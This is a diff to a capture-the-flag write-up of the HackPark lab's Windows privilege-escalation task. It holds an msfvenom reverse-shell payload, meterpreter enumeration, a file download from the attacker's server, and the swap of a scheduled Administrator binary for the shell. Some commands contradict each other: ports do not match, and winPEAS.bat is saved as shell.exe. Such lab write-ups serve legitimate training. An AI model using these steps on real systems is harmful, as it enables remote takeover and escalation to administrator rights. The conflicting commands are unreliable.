@@ -352,6 +352,10 @@ Answer: iis apppool\blog
 
 # Task 4 Windows Privilege Escalation
 
+## Q1 First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.
+Answer: none required.
+Tip:You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!
+
 Here a more stable reverse shell is the goal that from the exploit so a msfvenom meterpreter payload is required for a windows system:
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f exe > shell.exe
@@ -422,7 +426,116 @@ File transferred successfully after changing port 8000 to 6000 even though previ
 ```
 root@ip-<AttackBoxIP>:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server 6000
 Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:6000/) ...
-<targetIP> - - [19/Apr/2026 21:11:30] code 404, message File not found
-<targetIP> - - [19/Apr/2026 21:11:30] "GET /shell.exe HTTP/1.1" 404 -
 <targetIP> - - [19/Apr/2026 21:13:24] "GET /winPEAS.bat HTTP/1.1" 200 -
 ```
+Output when winPEAS is run will run off the screen so save to file from the directory its uploaded to:
+```
+c:\windows\temp\winPEAS.bat > output.txt
+```
+Then download from meterpreter using: download <remote_path> <local_path> 
+In this case:
+```
+meterpreter> download C:\\Windows\\Temp\\output.txt /home/kali/CTF/HackPark/
+```
+
+Its worth noting upload similar way except it does not work possibly due to EDR or antivirus or limitations of the THM target.
+That is using, upload <remote_path> <local_path> 
+
+
+## Q2 What is the OS version of this windows machine?
+This can be obtained from winPEAS output.txt file or just typing sysinfo in meterpreter
+```
+meterpreter > sysinfo
+Computer        : HACKPARK
+OS              : Windows Server 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > 
+```
+Answer: Windows 2012 R2 (6.3 Build 9600)
+
+## Q3 Can you spot a service running some automated task that could be easily exploited? What is the name of this service?
+This is where winPEAS output is used. Look in "[+] RUNNING PROCESSES" section
+Answer: WindowsScheduler  
+
+## Q4 What is the name of the binary you're supposed to exploit?
+This requires digging deeper in the WindowsSchedular
+```
+meterpreter > cd "program files (x86)"
+meterpreter > dir
+Listing: c:\program files (x86)
+===============================
+
+Mode          Size  Type  Last modified           Name
+----          ----  ----  -------------           ----
+040777/rwxrw  0     dir   2013-08-22 16:39:30 +0  Common Files
+xrwx                      100
+040777/rwxrw  4096  dir   2014-03-21 19:07:01 +0  Internet Explorer
+xrwx                      000
+040777/rwxrw  0     dir   2013-08-22 16:39:30 +0  Microsoft.NET
+xrwx                      100
+040777/rwxrw  8192  dir   2019-08-04 12:37:02 +0  SystemScheduler
+xrwx                      100
+040777/rwxrw  0     dir   2019-08-06 22:12:04 +0  Uninstall Information
+xrwx                      100
+040777/rwxrw  0     dir   2013-08-22 16:39:33 +0  Windows Mail
+xrwx                      100
+040777/rwxrw  0     dir   2013-08-22 16:39:30 +0  Windows NT
+xrwx                      100
+040777/rwxrw  0     dir   2013-08-22 16:39:30 +0  WindowsPowerShell
+xrwx                      100
+100666/rw-rw  174   fil   2013-08-22 16:37:57 +0  desktop.ini
+-rw-                      100
+
+meterpreter > cd systemscheduler
+meterpreter > cd events
+meterpreter > pwd
+c:\program files (x86)\systemscheduler\events
+meterpreter > dir
+Listing: c:\program files (x86)\systemscheduler\events
+======================================================
+
+Mode          Size   Type  Last modified          Name
+----          ----   ----  -------------          ----
+100666/rw-rw  1961   fil   2026-04-20 19:45:34 +  20198415519.INI
+-rw-                       0100
+100666/rw-rw  32045  fil   2026-04-20 19:45:34 +  20198415519.INI_LOG.t
+-rw-                       0100                   xt
+100666/rw-rw  290    fil   2020-10-02 22:50:12 +  2020102145012.INI
+-rw-                       0100
+100666/rw-rw  186    fil   2026-04-20 19:42:25 +  Administrator.flg
+-rw-                       0100
+100666/rw-rw  182    fil   2026-04-20 19:42:23 +  SYSTEM_svc.flg
+-rw-                       0100
+100666/rw-rw  0      fil   2026-04-20 18:00:30 +  Scheduler.flg
+-rw-                       0100
+100666/rw-rw  449    fil   2026-04-20 19:42:25 +  SessionInfo.flg
+-rw-                       0100
+100666/rw-rw  0      fil   2026-04-20 19:45:20 +  service.flg
+-rw-                       0100
+```
+
+```
+meterpreter > head 20198415519.INI_LOG.txt 
+04/20/26 11:43:02,Event Started Ok, (Administrator)
+04/20/26 11:43:33,Process Ended. PID:4076,ExitCode:4,Message.exe (Administrator)
+04/20/26 11:44:02,Event Started Ok, (Administrator)
+04/20/26 11:44:33,Process Ended. PID:2516,ExitCode:4,Message.exe (Administrator)
+04/20/26 11:45:03,Event Started Ok, (Administrator)
+04/20/26 11:45:34,Process Ended. PID:1432,ExitCode:4,Message.exe (Administrator)
+04/20/26 11:46:02,Event Started Ok, (Administrator)
+04/20/26 11:46:33,Process Ended. PID:1540,ExitCode:4,Message.exe (Administrator)
+04/20/26 11:47:02,Event Started Ok, (Administrator)
+04/20/26 11:47:33,Process Ended. PID:2140,ExitCode:4,Message.exe (Administrator)
+meterpreter > 
+```
+run simple server again use the shell.exe 
+meterpreter> shell
+c:\Program Files (x86)\systemscheduler\> powershell -c "Invoke-WebRequest -Uri 'http://10.146.85.223:8000/winPEAS.bat' -Outfile 'c:\program files (x86)\systemscheduler\events\shell.exe'
+then
+rename message.exe message.bak
+rename shell.exe message.exe
+
